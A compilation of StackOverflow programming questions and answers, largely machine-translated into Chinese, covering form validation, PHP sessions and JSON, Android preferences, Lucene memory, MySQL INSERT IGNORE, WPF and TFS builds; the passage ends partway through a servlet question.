# StackOverflow 问答 12429000-12429999

# javascript - JS 验证 ajax 返回的 html 中的表单数据

> ID：12429000
> 
> 赞同：0
> 
> 时间：2012-09-14T17:06:08.460
> 
> 标签：javascript, jquery

Ajax 返回的 HTML 包括一个表格和一个提交按钮 (type=button)

该表包括用于克隆表行的 jQuery 例程（每行允许选择/上传一个文件，并且有两个值：`<input type="text">`用于文档标题和`<input type="file">`.

```
<table id="MyTable">
<tr name="tr3" id="tr3">
    <td>
        <input type="text" name="dt[]" id="dt1">
    </td>
    <td>
        <input type="file" name="fff[]" id="ff1">
    </td>
</tr>
</table>
<input type="button" name="sub1" id="sub1" value="Submit" onclick="checkform();"> 
```

提交表单后，我必须检查每个文档标题是否已填写，因此提交按钮会调用 javascript 例程：

```
function checkform()
{
    if(document.updateprojectdocs.dt[0].value=='')
    {
        alert("Fields marked with an asterisk are required.");
        document.updateprojectdocs.dt[0].focus();
        return;
    }

    document.getElementById("TheForm").submit();
} 
```

当然，这不起作用（脚本在表单提交之前死掉——但是如果我删除前面的 if 结构，则提交）。谁能告诉我为什么以及如何解决？

`dt[]`此外，要检查的字段数量不确定。我怎么能构造一个循环来做到这一点？我怀疑 jQuery 的 .find().each() 可以使用，但不确定会是什么样子？

* * *

更新：

感谢DaHaKa在下面的回复，我更接近解决方案。我将 DaHaKa 的建议代码修改为 jQuery。

我在与 DaHaKa 沟通时遇到了问题——由于某种原因，他的回复直到他发布了很久很久很久之后才出现（问题可能出在我这边）。当我等待（几个小时）时，我在另一个问题中发布了部分问题并最终在那里解决了它。另一个问题变成了[完全正确的答案](https://stackoverflow.com/questions/12430456/looping-through-array-of-dynamically-added-elements/12432993#12432993)，我将未来的观众引导到那里。请注意，用户`thecodeparadox`创建[了完整解决方案的工作 JSFiddle](http://jsfiddle.net/BGy4M/11/)。

我把这个问题交给了 DaHaKa，因为他非常愿意并且能够提供帮助，但通信问题介入了。再次感谢，D。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:10:26.977

在这种情况下，jQuery 每个函数都不是必需的，你可以像这样简单地做到这一点 =>

尝试

```
<table id="MyTable">
<tr name="tr3" id="tr3">
    <td>
        <input type="text" name="dt" id="dt1">
    </td>
    <td>
        <input type="file" name="fff" id="ff1">
    </td>
</tr>
</table>

<input type="button" name="sub1" id="sub1" value="Submit"> 
```

JavaScript

```
document.getElementById("sub1").onclick = function(){
    if (document.getElementById("dt1").value!=""){
        document.getElementById("TheForm").submit();
    } else {
        alert("Empty Field(s) !");
    }
}; 
```

你应该`ids`在 html 标签中使用 JavaScript，而不是`NAME`标签

至于你的文件输入，你可以从你的服务器端脚本语言（如php）中理解它，具有超级全局变量`$_FILES['file']['error']`类型

# api - Multiple password encrypt/protect a single file

> ID：12429002
> 
> 赞同：2
> 
> 时间：2012-09-14T17:06:16.667
> 
> 标签：api, encryption, zip, rar

This one is tough to Google. I'm trying to find a solution or API to encrypt/protect a file with multiple passwords. The passwords would be handed out to users separately.

I looked at DotNetZip and the usual Zip and Rar solutions (including PKWare) for a way to multi-password protect a file.

All suggestions are welcome! I wouldn't be posting this question if it was either impossible or uncommon. Thanks!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:17:40.920

You can use passphrase-based OpenPGP encryption. It lets you specify several independent passphrases and supports compression. [OpenPGPBlackbox](http://www.eldos.com/sbb/net-pgp.php) package of our SecureBlackbox product does this (among a number of other features) and it's available for .NET, Java and VCL.

# php - 如何使用 session_save_path()？

> ID：12429003
> 
> 赞同：1
> 
> 时间：2012-09-14T17:06:16.813
> 
> 标签：php

如果我有 3 个 php 脚本（Text1.php、Text2.php 和 Text3.php），当我使用 session_save_path() 时，最好将所有会话详细信息保存到一个文件中还是应该保存在单独的文件中？

换句话说，下面的代码是否进入了 Text1.php、Text2.php 和 Text3.php：

```
session_save_path("helios.hud.ac.uk/u09999999/Computer_app/sessionData.php"); 
```

或者

应该是Text1.php：

```
session_save_path("helios.hud.ac.uk/u09999999/Computer_app/sessionData1.php"); 
```

文本2.php

```
session_save_path("helios.hud.ac.uk/u09999999/Computer_app/sessionData2.php"); 
```

文本3.php

```
session_save_path("helios.hud.ac.uk/u09999999/Computer_app/sessionData3.php"); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:19:12.710

如果您希望它们共享会话数据，则需要让所有三个脚本使用相同的路径，这有点像会话的重点。

此外， session_save_path() 设置要使用的*目录*的名称，而不是文件的名称。PHP 将确定文件名。

所以对所有脚本使用一个值：

```
session_save_path('/path/to/session/data/directory'); 
```

或者更好的是，将其设置在每个脚本中包含的初始化脚本中：

```
init.php:
    session_save_path('/path/to/session/data/directory');

text1.php:
    require_once 'init.php'; 
```

编辑：另外，请确保运行 Web 服务器的进程可以写入该目录。请注意，您还可以通过编辑 php.ini 中的相应行来全局设置此值，无论该行可能存储在您的特定系统上的什么地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:19:09.783

session_save_path 的参数是文件夹而不是文件。PHP 为它创建的每个会话创建一个文件。

尊重共享相同位置的部分，您可以回答这个问题。我的脚本是否需要查看其他脚本在会话中保存的数据？

如果为真，那么是的，对所有这些都使用相同的参数，你可能会使用不同的路径。

# java - Android 中的简单 SharedPreferences

> ID：12429013
> 
> 赞同：2
> 
> 时间：2012-09-14T17:07:30.627
> 
> 标签：java, android, sharedpreferences

我遇到了问题，我已经尝试了我在这个网站上找到的所有东西，它没有帮助，所以我自己问这个问题。

我的代码是：

```
public class MyActivity extends Activity{

    protected PositionSense positionSense;
    protected Preferences preferences;
    String IP;
    String ID;

@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        positionSense = new PositionSense(this, null);
        SharedPreferences settings = getSharedPreferences("preferences", 0);
        IP = settings.getString("ip", "http://192.168.1.3:8080/servlet");
        ID = settings.getString("id", "USER");
    } 
```

稍后，我在后台运行线程中使用这些变量，该线程与 servlet 联系并发送一些信息（包括保存在首选项中的用户的位置和 ID）

我没有发布所有这些，因为我不想过多地阻塞线程（但如果需要，我会全部发布）

无论如何，它不起作用，它给了我以下错误日志：

```
09-14 16:47:20.854: WARN/dalvikvm(552): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
09-14 16:47:20.884: ERROR/AndroidRuntime(552): FATAL EXCEPTION: main
        java.lang.IllegalStateException: Could not execute method of the activity
        at android.view.View$1.onClick(View.java:3044)
        at android.view.View.performClick(View.java:3511)
        at android.view.View$PerformClick.run(View.java:14105)
        at android.os.Handler.handleCallback(Handler.java:605)
        at android.os.Handler.dispatchMessage(Handler.java:92)
        at android.os.Looper.loop(Looper.java:137)
        at android.app.ActivityThread.main(ActivityThread.java:4424)
        at java.lang.reflect.Method.invokeNative(Native Method)
        at java.lang.reflect.Method.invoke(Method.java:511)
        at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
        at dalvik.system.NativeStart.main(Native Method)
        Caused by: java.lang.reflect.InvocationTargetException
        at java.lang.reflect.Method.invokeNative(Native Method)
        at java.lang.reflect.Method.invoke(Method.java:511)
        at android.view.View$1.onClick(View.java:3039)
        ... 11 more
        Caused by: java.lang.NullPointerException
        at com.moodswings.MoodSwingsActivity.clickHappy(MoodSwingsActivity.java:94)
        ... 14 more 
```

我不知道该怎么办。

有人可以给我一种最简单的方法来将 2 个字符串保存在一个活动中的首选项中，这些字符串用于同一应用程序中的其他活动吗？它应该很简单，但我根本无法让它工作，而且我快到最后期限了。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:43:34.923

要保存到共享首选项，您可以尝试：

```
String ip = "192.168.1.1";
SharedPreferences prefs = getSharedPreferences("IP", Context.MODE_PRIVATE);
prefs.edit().putString("Sample IP", ip).commit(); 
```

要从共享首选项中获取信息，您可以尝试：

```
String newIP = prefs.getString("Sample IP");//You can also place a default value if needed; to bypass the null character. 
```

现在要将它们传递到活动中，您可以尝试执行如下所示的意图调用

```
**Activity One
Intent intent = new Intent(getApplicationContext(),SecondActivity.class);
intent.putExtra("IP",newIp);  
startActivity(intent);

**Activity Two
Bundle extras = intent.getExtras(); 
String tmp = extras.getString("IP"); 
```

您也可以使用[此链接](https://stackoverflow.com/questions/5734721/android-shared-preferences)进行参考。

# android - Android Lucene OutOfMemoryExceptoin

> ID：12429016
> 
> 赞同：2
> 
> 时间：2012-09-14T17:07:35.667
> 
> 标签：android, memory, lucene

我有一个 Lucene 索引，其中包含来自 1740 本书的 50571 个文档。我有两个创建此索引的进程。第一个过程是逐个文档在设备上创建索引。这个过程非常缓慢。另一个过程是在服务器上创建图书索引（与我在设备上创建它的方式完全相同）并下载并将其与主索引合并。这个创建主索引要快得多。无论哪种方式，创建索引都可以正常工作。

问题是当我在下载合并索引上搜索时，我得到一个`OutOfMemoryException`，但是当我使用在设备上创建的索引进行搜索时，我没有得到那个错误。我逐本书（下载合并）浏览并创建索引书，并在每本书被索引后进行搜索；基于此，当我预订约 450 美元时，我开始获得`OutOfMemoryException`.

是什么导致我内存不足。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T19:55:57.710

Lucene 是一个记忆猪。当将“合并”索引一起写入时，它将整个索引集存储在内存中两次。[正如从 lucene文档](http://lucene.apache.org/core/old_versioned_docs/versions/3_5_0/api/core/org/apache/lucene/index/IndexWriter.html#addIndexes%28org.apache.lucene.store.Directory...%29)中引用的那样。

> 请注意，这需要目录中的临时可用空间最多为所有输入索引（包括起始索引）总和的 2 倍。如果读取器/搜索器针对起始索引打开，则所需的临时可用空间将高于起始索引的大小

那是很多记忆。为了缓解这种情况，我们必须通过调用索引编写器来缩小索引的大小`forceMerge(int)`。这是一个缓慢的过程，但它确实缩小了索引的大小。`1`每次索引目录中有 50 个或更多文件时，我都会用一个参数来调用它。

# php - 博客显示代码，将其他内容保留在帖子中

> ID：12429018
> 
> 赞同：0
> 
> 时间：2012-09-14T17:07:39.380
> 
> 标签：php, blogs, preg-match-all

好的，我有一些代码可以找到`<code></code>`标签集并清理其中的任何代码，以便它显示而不是像常规代码那样运行。一切正常，但我的问题是如何在里面找到标签集/多个标签集，比如`$content`. 清理代码，仍然包含所有其他内容？这是我的代码，问题是它会检查匹配项，找到匹配项时会对其进行清理。但是在它清理之后，它就无法将它放回原来的位置`$content`。（`$content`正在从表格中抓取）

```
<?php
preg_match_all("'<code>(.*?)</code>'si", $html, $match);
if ($match) {
  foreach ($match[1] as $snippet) {
    $fixedCode = htmlspecialchars($snippet, ENT_QUOTES);          
  }
}
?> 
```

既然 $fixedCode 是干净的，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:35:02.003

使用[正则表达式解析 HTML](https://stackoverflow.com/a/1732454/1209423)是不好的。我建议熟悉 DOM 解析器，例如[PHP 的 DOM 模块](http://php.net/manual/en/book.dom.php)。

> DOM 扩展允许您使用 PHP 5 通过 DOM API 对 XML 文档进行操作。

使用 DOM 模块，为了从`<code>`文档中的标签获取 HTML/数据，您需要执行以下操作：

```
<?php
//So many variables!
$html = "<div> Testing some <code>code</code></div><div>Nother div, nother <code>Code</code> tag</div>";

$dom_doc = new DOMDocument;

$dom_doc->loadHTML($html);

$code = $dom_doc->getElementsByTagName('code');

foreach ($code as $scrap) {
    echo htmlspecialchars($scrap->nodeValue, ENT_QUOTES), "<br />";
}
?> 
```

# fortran - fortran 未定义对 popcnt_ 的引用

> ID：12429022
> 
> 赞同：0
> 
> 时间：2012-09-14T17:07:52.280
> 
> 标签：fortran, fortran90

我正在尝试编译一个调用 POPCNT 的 fortran 90 程序，如下所示：

```
 ...
 print *, popcnt(127)
 ... 
```

通过编译如下：

```
 gfortran prog.f90 
```

它给了我以下信息：

```
 ...: undefined reference to `popcnt_' 
```

PLZ谁能建议正确的编译方式？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:45:32.683

`bitcnt`在 4.6 版中添加了对 [http://gcc.gnu.org/wiki/GFortran#GCC4.6](http://gcc.gnu.org/wiki/GFortran#GCC4.6)的支持。所以你必须找到更新的可执行文件，或者自己编译。

# iphone - COCOS2d - 重用 Sprite 和替换场景

> ID：12429025
> 
> 赞同：1
> 
> 时间：2012-09-14T17:08:00.057
> 
> 标签：iphone, objective-c, ios, data-structures, cocos2d-iphone

我有 2 个场景，两个场景共享相同的背景图像，所以我在两个场景的 init 方法中都有下面的代码并添加。一切正常。我的问题是，既然同一个图像文件被读取了两次，分配了内存并解除了分配，那么为什么我们不能使用单例模式将它存储在一个公共位置（spriteManager）并重用该实例？如果我这样做，当场景 1 被场景 2 替换时，内存将被释放。

我想到的一个是保留，但不知道如何以及在哪里处理这个保留。如果我的处理通用可重用精灵的方法是错误的，那么请建议我做同样的正确方法。我是这个 cocos2d 的新手，所以我还没有阅读 sprite sheet 的概念，现在我想保持一切简单。

```
CCSprite *bg = [CCSprite spriteWithFile:@"bg.png"]; 
```

第二个问题，我在替换两个重场景时阅读，由于释放第一个场景内存和分配下一个场景内存的重叠，会有一些内存泄漏的机会。因此，为了避免这种情况，我读到我们必须暂停几秒钟来加载轻量级场景（加载场景）。这是一个好的解决方案还是替换场景本身不会产生任何问题。

如果有一篇关于这篇文章标题的好文章（重用 Sprite 和替换场景），那就太好了。.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:34:22.193

要回答你的第一个问题，你不需要 spriteManager，因为 cocos2D 已经有一个默认的纹理缓存机制（参考 ccTextureCache 类），当你下次调用 spriteWithFile 时，它​​只会从纹理缓存中加载纹理。注意：ccTextureCache 通常在出现内存警告时清除其纹理。

其次，如果您已正确释放对象，则在替换场景时不应该有任何内存泄漏。你能提供一个链接到你读到这个的地方吗？

# latitude-longitude - 谷歌地图 - 推导纬度/经度点

> ID：12429028
> 
> 赞同：1
> 
> 时间：2012-09-14T17:08:30.447
> 
> 标签：latitude-longitude

我想从给定的纬度/经度点推导出纬度/经度，它位于东 x 英寸和南 y 英寸。为此，我使用了以下链接中的信息和公式：http: [//www.appelsiini.net/2008/11/introduction-to-marker-clustering-with-google-maps](http://www.appelsiini.net/2008/11/introduction-to-marker-clustering-with-google-maps) 基本上我的方法执行以下操作：

```
public static double adjustLongitudeByPixels(double longitude, long pixelsY) {
 int zoom = 21; // use zoom level 21
 double scaledPixels = (pixelsY << (21 - zoom)) / GOOGLE_SCALING_AT_ZOOM_21;
 return xToLongitude(longitudeToX(longitude) + scaledPixels);
}
public static double adjustLatitudeByPixels(int overviewScale, double latitude, long pixelsX) {
 int zoom = 21; // use zoom level 21
 double scaledPixels = (pixelsX << (21 - zoom)) / GOOGLE_SCALING_AT_ZOOM_21;
 return yToLatitude(latitudeToY(latitude) + scaledPixels);
} 
```

...其中经度/纬度是从起点开始的，像素是从起点向东或向南的像素数。我通过将我的实际 x/y 英寸距离乘以 96（每英寸的像素数）来获得像素 X 和像素 Y。所以我基本上以 1:1 的比例获得像素。由于 latitudeToY 和 longitudeToX 使用缩放级别 21 的单位像素，我除以缩放级别 21 的缩放比例。如果我没记错的话，这个缩放比例是 1:282.124305。

但是，这种方法不会产生预期的结果。由此产生的纬度/经度与我的预期略有不同。

如果我的逻辑有缺陷，请告诉我......提前致谢！

# php - php从json编码中获取值

> ID：12429029
> 
> 赞同：41
> 
> 时间：2012-09-14T17:08:29.893
> 
> 标签：php, json

我有一个 url 传递参数使用 json_encode 每个值，如下所示：

```
$json = array
(
    'countryId' => $_GET['CountryId'],
    'productId' => $_GET['ProductId'],
    'status'    => $_GET['ProductId'],
    'opId'      => $_GET['OpId']
);

echo json_encode($json); 
```

它返回的结果如下：

```
{  
  "countryId":"84",
  "productId":"1",
  "status":"0",
  "opId":"134"
} 
```

我可以`json_decode`用来解析每个值以进行进一步的数据处理吗？

谢谢。

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2012-09-14T17:12:40.137

`json_decode()`如果第二个值为真，将返回一个对象或数组：

```
$json = '{"countryId":"84","productId":"1","status":"0","opId":"134"}';
$json = json_decode($json, true);
echo $json['countryId'];
echo $json['productId'];
echo $json['status'];
echo $json['opId']; 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-09-14T17:14:43.927

json_decode 将返回最初编码的相同数组。例如，如果你

```
$array = json_decode($json, true);
echo $array['countryId']; 
```

或者

```
$obj= json_decode($json);

echo $obj->countryId; 
```

这两个都会回显 84。我认为 json_encode 和 json_decode 函数名称是不言自明的......

# c++ - 模拟矩阵背景

> ID：12429030
> 
> 赞同：1
> 
> 时间：2012-09-14T17:08:35.547
> 
> 标签：c++

我正在托盘模拟`Matrix`电影的背景，我编写了以下代码：

```
#include <iostream>
#include<windows.h>
#include <conio.h>
using namespace std;

void CursorPosition(short x, short y) {
    COORD coordScreen = {x, y};
    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coordScreen);
}

void color(int nb) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), nb);
}
int main(int argc, char *argv[]) {
    unsigned int y[79];
    unsigned int ymin[79];
    unsigned int a, b;

    char i[36] = {48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69,
    70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87,
    88, 89, 90};

    system("title The Matrix !");
    color(10);

    for (a = 0; a < 79; a++) {
        y[a] = 0;
        ymin[a] = 1;
    }

    do {
        for (unsigned int x = 0; x < 79; x++) {
            for (unsigned int j = 0; j < 5; j++) {
                a = rand() % 79;
                if (y[a] != 0) {
                    b = rand() % y[a] + ymin[a];
                    if (b < 26) {
                        if (b < ymin[a] + 2 & b > 2) color(2);
                        CursorPosition(a + 1, b);
                        cout << i[rand() % 36];
                        color(10);
                    }
                }
            }
            if (y[x] != 0 || (rand() % 50) == 0) {
                if ((rand() % (y[x] + 1)) < 20 & ymin[x] == 1) {
                    y[x]++;
                } else {
                    CursorPosition(x + 1, ymin[x]);
                    cout << " ";
                    ymin[x]++;
                    if (ymin[x] < 25) {
                        color(2);
                        CursorPosition(x + 1, ymin[x] + 1);
                        cout << i[rand() % 36];
                        color(10);
                    }
                }
                if ((y[x] + ymin[x]) < 26) {
                    CursorPosition(x + 1, y[x] + ymin[x]);
                    color(15);
                    cout << i[rand() % 36];
                    color(10);
                }
                if ((y[x] + ymin[x]) < 27) {
                    CursorPosition(x + 1, y[x] + ymin[x] - 1);
                    cout << i[rand() % 36];
                }
            }
            if (ymin[x] > 25) {
                ymin[x] = 1;
                y[x] = 0;
            }j
        }
        Sleep(35);
    } while (!kbhit());

    return 0;
} 
```

您对改进代码有什么建议吗？我的目的是这样的： ![在此处输入图像描述](../Images/7f2aeea2a9dca6864116fbd8d5a12850.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:26:31.380

你的代码没有写那些字符。它正在编写简单的字母字符数字 0-9。

您需要的是**半角假名字符**：

```
｡   ｢   ｣   ､   ･   ｦ   ｧ   ｨ   ｩ   ｪ   ｫ   ｬ   ｭ   ｮ   ｯ
    ｰ   ｱ   ｲ   ｳ   ｴ   ｵ   ｶ   ｷ   ｸ   ｹ   ｺ   ｻ   ｼ   ｽ   ｾ   ｿ
    ﾀ   ﾁ   ﾂ   ﾃ   ﾄ   ﾅ   ﾆ   ﾇ   ﾈ   ﾉ   ﾊ   ﾋ   ﾌ   ﾍ   ﾎ   ﾏ
    ﾐ   ﾑ   ﾒ   ﾓ   ﾔ   ﾕ   ﾖ   ﾗ   ﾘ   ﾙ   ﾚ   ﾛ   ﾜ   ﾝ   ﾞ   ﾟ 
```

我认为你需要提升库的 `boundary`部分来获得这些。

我发现的一些例子：

```
boost::locale::generator gen;
using namespace boost::locale::boundary;
std::string text="生きるか死ぬか、それが問題だ。";
ssegment_index map(word,text.begin(),text.end(),gen("ja_JP.UTF-8")); 
for(ssegment_index::iterator it=map.begin(),e=map.end();it!=e;++it) {
    std::cout << "Segment " << *it << " contains: ";
    if(it->rule() & word_none)
        std::cout << "white space or punctuation marks ";
    if(it->rule() & word_kana)
        std::cout << "kana characters ";
    if(it->rule() & word_ideo)
        std::cout << "ideographic characters";
    std::cout<< std::endl;
} 
```

输出：

```
Segment 生 contains: ideographic characters
Segment きるか contains: kana characters 
Segment 死 contains: ideographic characters
Segment ぬか contains: kana characters 
Segment 、 contains: white space or punctuation marks 
Segment それが contains: kana characters 
Segment 問題 contains: ideographic characters
Segment だ contains: kana characters 
Segment 。 contains: white space or punctuation marks 
```

[资源](http://www.boost.org/doc/libs/1_50_0/libs/locale/doc/html/boundary_analysys.html)

# wpf - 在 Datagrid 中滚动

> ID：12429033
> 
> 赞同：0
> 
> 时间：2012-09-14T17:08:41.530
> 
> 标签：wpf, mvvm, datagrid

我正在使用 MVVM。我使用一些代码将数据网格绑定到集合：

```
<commonMVVMControls:GridControl DataContext="{Binding Path=ClientsListGrid,
                                                          Mode=TwoWay}" 
```

它是 DataGridControl 类：

```
public class GridControl : DataGrid
{
    public GridControl()
    {
        this.DataContextChanged += new System.Windows.DependencyPropertyChangedEventHandler(GridControl_DataContextChanged);
    }

    void GridControl_DataContextChanged(object sender, System.Windows.DependencyPropertyChangedEventArgs e)
    {
        var bindingItemsSource = new Binding("ItemsSource");
        bindingItemsSource.Source = this.DataContext;
        this.SetBinding(DataGrid.ItemsSourceProperty, bindingItemsSource);

        this.RowStyle = new Style(typeof(DataGridRow));
        this.RowStyle.Setters.Add(new Setter(DataGridRow.IsSelectedProperty, new Binding("IsSelected")));
    } 
```

现在是 ViewModel 中的一段代码：

```
var selectedClient = this.ClientsListGrid.ItemsSource.Where(x => x.IsSelected);
        if (!selectedClient.Any()) 
        {
            MessageBox.Show(Resource.Resource.UpdateUserError, Resource.Resource.Warning, MessageBoxButton.OK, MessageBoxImage.Stop,
            MessageBoxResult.OK);
            return;
        }

        var viewModel = new AddOrUpdateClientViewModel(_serviceContext, selectedClient.First()); 
```

**它运作良好。但是，如果我向下或向上滚动数据网格，它就会停止工作，并且 IsSelected 总是等于 false。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T17:18:49.717

尝试看看如果禁用虚拟化会发生什么。这可能与此有关。

# c - 不使用间接函数编译 glibc

> ID：12429034
> 
> 赞同：1
> 
> 时间：2012-09-14T17:08:42.750
> 
> 标签：c, gcc, malloc, glibc

我正在使用 PIN 从 glibc 中检测 malloc/free。PIN 不能检测间接函数，并且在 glibc 2.15+ 版中，malloc 被定义为 ifunct。我相信恢复到旧版本的 glibc（Ubuntu 12.04 使用 2.15）几乎是不可能的，所以：

*   首先，什么是间接函数？
*   我可以使用 gcc 进行编译，以便在共享库中不创建 ifunc 吗？

谢谢！

# android - 如何使我的自定义列表视图可扩展列表视图

> ID：12429040
> 
> 赞同：0
> 
> 时间：2012-09-14T17:09:23.007
> 
> 标签：android

我创建了一个带有自定义 baseAdapter 的列表视图（我自己的类扩展了它），一切看起来都很好。

但是，我正在考虑使此列表可扩展（当您单击列表项时，它会展开以显示子项）。我怎样才能做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:19:24.177

看这个

[http://android-adda.blogspot.in/2011/06/custom-expandable-listview.html](http://android-adda.blogspot.in/2011/06/custom-expandable-listview.html)

# javascript - 检查 onsubmit 上的功能不工作 jquery contactform

> ID：12429041
> 
> 赞同：0
> 
> 时间：2012-09-14T17:09:24.293
> 
> 标签：javascript, jquery, ajax, forms, validation

更新..

代码现在有效

必须更改表单提交的验证声明。删除了有效的变量等，但它现在可以工作了谢谢

固定提交到

```
$('form').on("submit", function(e) {

            //Prevent default
            e.preventDefault();

                    if(validateName() & validateSubject() & validateEmail() & validateMessage())
                    {
                        $('form #status').removeClass().addClass('processing').html('Processing...').fadeIn('fast');

                        // maak variable met alle data die verstuurd kan worden
                        var formData = $('form').serialize();

                        //functie om data naar server te sturen
                        submitForm(formData);
                        return true;
                    }

                    else
                    {
                        $('form #status').removeClass().addClass('error')
                            .html('<strong>Form is not filled in correctly</strong>').fadeIn('fast')
                        return false;
                    }

            }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:47:58.383

您的问题是您没有阻止提交表单。相反，您连接到提交按钮，然后在出现问题时仅显示错误消息（但无论如何都会提交表单，因此错误消息没有帮助）。

您可以/应该做几件事来解决这个问题。首先，您可能希望将验证代码附加到表单的提交事件（而不是提交按钮的单击事件）。这将确保如果您将来提供其他方式来提交表单，您将不需要单独维护每个方法的验证钩子。所以而不是：

```
$('form #submit').click(function(e) { 
```

你可能想要：

```
$('form').on("submit", function(e) { 
```

其次，如果表单有问题，您希望`false`在提交处理程序中返回。这将导致一个隐含的`e.preventDefault()`，这将阻止表单提交：

```
if (valid != '') {
    $('form #status').removeClass().addClass('error')
        .html('<strong>Correct these errors<BR></strong>' + valid).fadeIn('fast');
    return false; //stop form submission
    //Or you could do e.preventDefault(); if you're not ready to end the function yet.
} 
```

这应该可以解决您最紧迫的问题。坚持下去！

# mysql - mySQL INSERT IGNORE 不会“忽略”

> ID：12429044
> 
> 赞同：2
> 
> 时间：2012-09-14T17:09:33.107
> 
> 标签：mysql

据我了解，INSERT IGNORE 会插入一个新条目，如果它尚不存在，则忽略它。所以我一直在尝试这样做一段时间，但它似乎不起作用。这是我的尝试：

```
insert insert ignore into rss_feeds (md5sum) values ("1234");
Query OK, 1 row affected (0.00 sec)

mysql> insert ignore into rss_feeds (md5sum) values ("1234");
Query OK, 1 row affected (0.00 sec)

mysql> insert ignore into rss_feeds (md5sum) values ("1234");
Query OK, 1 row affected (0.00 sec)

mysql> insert ignore into rss_feeds (md5sum) values ("1234");
Query OK, 1 row affected (0.00 sec)

mysql> select * from rss_feeds where md5sum="1234";
+------+--------+----------+---------+----------+--------+--------+---------+
| link | source | headline | updated | inserted | md5sum | itemid | emailed |
+------+--------+----------+---------+----------+--------+--------+---------+
| NULL | NULL   | NULL     | NULL    | NULL     | 1234   |   NULL |    NULL |
| NULL | NULL   | NULL     | NULL    | NULL     | 1234   |   NULL |    NULL |
| NULL | NULL   | NULL     | NULL    | NULL     | 1234   |   NULL |    NULL |
| NULL | NULL   | NULL     | NULL    | NULL     | 1234   |   NULL |    NULL | 
+------+--------+----------+---------+----------+--------+--------+---------+
4 rows in set (0.00 sec) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T17:11:30.583

如[`INSERT`语法](http://dev.mysql.com/doc/en/insert.html)中所述：

> 如果没有`IGNORE`，复制表中现有`UNIQUE`索引或`PRIMARY KEY`值的行会导致重复键错误并且语句被中止。使用`IGNORE`，该行仍然没有插入，但没有发出错误。

您需要在以下位置定义`UNIQUE`索引`md5sum`：

```
ALTER TABLE rss_feeds ADD UNIQUE INDEX (md5sum); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:11:23.037

IGNORE 将忽略任何唯一键约束产生的错误。基本上它只会忽略插入时发生的任何错误。

# tfs - 我可以将 TFS 2010 与在 Visual Studio 2012 中创建的 Asp.net MVC 3 解决方案一起使用吗

> ID：12429048
> 
> 赞同：0
> 
> 时间：2012-09-14T17:09:44.723
> 
> 标签：tfs, visual-studio-2012

我有一个带有旧项目的 tfs2010 服务器，我想开始使用 VS 2012 以使用更好的 IDE 并将 VS2010 Asp.Net MVC 解决方案转换为 VS2012 保持相同的框架，我可以这样做以及所有自动部署和测试仍在 TFS 服务器上工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T20:56:18.197

当然，VS2012 可以很好地与 TFS 2010 配合使用，并且 TFS 2010 将保存您发送的任何代码。也就是说，当涉及到您发送到服务器的项目类型时，它是不可知的。

# version-control - TFS 源代码控制未压缩构建

> ID：12429056
> 
> 赞同：0
> 
> 时间：2012-09-14T17:10:17.857
> 
> 标签：version-control, build, tfs

有没有办法创建“构建”但实际上不编译站点的输出？基本上，我想将文件从 TFS 中的源代码管理实时推送到最终的 IIS 文件夹目标。

我在我的其他项目构建中使用了 CopyDirectory，但这需要 BuildDetail.DropLocation（编译构建）。也许我可以使用不需要构建 DropLocation 的 CopyDirectory Source 的另一个选项。

为简化起见，我想使用构建模板将文件直接从 tfs 源控件复制到文件夹，但这不会编译文件。那可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T21:44:08.253

While the default .xaml build workflow for Team Foundation Build is indeed a compilation build it does not have to be. I usually recommend teams to at least have one compile and one deploy .xaml workflow.

1) The CompileMyStuff.xaml (DefaultBuildTemplate.xaml) should take my stuff from source control and do whatever is needed to create a Build Drop folder with my output. I may or may not need to actually compile before creating the drop, and it looks like you just want to copy to the drop location.

2) The DeployMyStuff.xaml should take a build number and deploy my code to an environment of my choice.

It looks like you want to skip the "Drop" and go state to deploy and while I would never recommend this you do have a "BuildDetail.BuildLocation" for teh local workspace where the build server has done a get of your code. You can just "CopyDirectory" from there to your server/host for the website.

If you are having a little trouble you could use the [Community Build Extensions](http://tfsbuildextensions.codeplex.com/documentation) and fire up PowerShell to do your copy/deploy.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T22:07:04.333

我想出了解决这个问题的办法。我创建了一个新的 .xaml 文件，然后我放入序列中的唯一项目是“DownLoadFiles”。然后我填写了任务的属性并运行了“构建”并且它起作用了。

# java - HTTP 状态 405 - 此 URL 不支持 HTTP 方法 POST

> ID：12429057
> 
> 赞同：3
> 
> 时间：2012-09-14T17:10:20.013
> 
> 标签：java, jsp, servlets, web.xml, http-status-code-405

我尝试发送一些数据，但似乎无法清楚地找到控制器或无法处理请求。

测试.jsp

```
